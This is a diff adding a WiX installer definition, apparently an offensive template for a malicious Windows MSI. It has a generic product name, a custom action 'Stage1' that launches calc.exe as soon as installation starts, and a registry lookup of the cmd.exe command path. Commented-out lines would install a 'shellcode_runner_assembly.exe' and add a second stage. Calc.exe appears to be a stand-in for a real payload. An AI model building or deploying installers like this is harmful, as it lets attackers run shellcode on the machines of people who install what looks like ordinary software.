@@ -1,0 +1,27 @@
+<?xml version="1.0"?>
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name" Version="0.0.1" Manufacturer="tasox" Language="1033">
+<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
+<Directory Id="TARGETDIR" Name="SourceDir">
+<Directory Id="ProgramFilesFolder">
+<Directory Id="INSTALLLOCATION" Name="Example">
+<!--<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
+	<File Id="Malakia.exe" Source="shellcode_runner_assembly.exe"/>
+</Component>-->
+</Directory>
+</Directory>
+</Directory>
+<Feature Id="DefaultFeature" Level="1">
+<!--<ComponentRef Id="ApplicationFiles"/>-->
+</Feature>
+<Property Id="BROWSER">
+  <RegistrySearch Id="DefaultBrowser" Type="raw" Root="HKCR" Key="Directory\shell\cmd\command" />
+</Property>
+<!--<Property Id="cmdline">C:\Windows\system32\calc.exe</Property>-->
+<CustomAction Id="Stage1" Property="BROWSER" ExeCommand="calc.exe"/>
+<InstallExecuteSequence>
+<Custom Action="Stage1" After="InstallInitialize"></Custom>
+<!--<Custom Action="Stage2" Before="InstallFiles"></Custom>-->
+</InstallExecuteSequence>
+</Product>
+</Wix>
